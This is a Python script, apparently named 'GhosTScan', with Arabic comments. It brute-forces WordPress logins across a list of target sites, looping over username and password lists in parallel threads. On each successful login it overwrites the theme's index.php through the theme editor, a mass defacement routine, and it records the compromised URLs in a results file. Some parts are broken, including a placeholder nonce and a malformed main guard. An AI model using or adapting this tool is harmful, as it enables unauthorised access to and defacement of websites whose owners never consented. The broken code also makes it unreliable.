import requests
import threading
import time

# عرض معلومات الأداة عند التشغيل
def print_banner():
    banner = """
    GhosTScan
    Coded by: @ww6ww6ww6
    """
    print(banner)

def upload_index(url, username, password, index_content, result_file):
    try:
        login_data = {
            'log': username,
            'pwd': password,
            'wp-submit': 'Log In',
            'redirect_to': f"{url}/wp-admin/",
            'testcookie': '1'
        }

        session = requests.Session()
        login_url = f"{url}/wp-login.php"
        login_response = session.post(login_url, data=login_data)

        if 'wp-admin' in login_response.url:
            print(f"\033[92m[+] Successfully logged in to {url}\033[0m")

            upload_url = f"{url}/wp-admin/theme-editor.php"
            upload_data = {
                'newcontent': index_content,
                'file': 'index.php',
                'action': 'edit-theme-plugin-file',
                '_wpnonce': 'your_nonce_value'
            }

            upload_response = session.post(upload_url, data=upload_data)
            if upload_response.status_code == 200:
                print(f"\033[92m[+] Index uploaded to {url}\033[0m")
                with open(result_file, 'a') as f:
                    f.write(f"{url}\n")
        else:
            print(f"\033[91m[-] Login failed for {url}\033[0m")

    except Exception as e:
        print(f"\033[91m[-] Error with {url}: {str(e)}\033[0m")

def load_list(filename):
    with open(filename, 'r') as file:
        return [line.strip() for line in file]

def main():
    print_banner()

    target_list = load_list('wp.txt')
    usernames = load_list('usernames.txt')
    passwords = load_list('passwords.txt')
    index_content = "Your index content here"
    result_file = 'results.txt'

    threads = []
    for url in target_list:
        for username in usernames:
            for password in passwords:
                t = threading.Thread(target=upload_index, args=(url, username, password, index_content, result_file))
                threads.append(t)
                t.start()
                time.sleep(0.6)  # 100 مواقع في الدقيقة

    for t in threads:
        t.join()

if name == "main":
    main()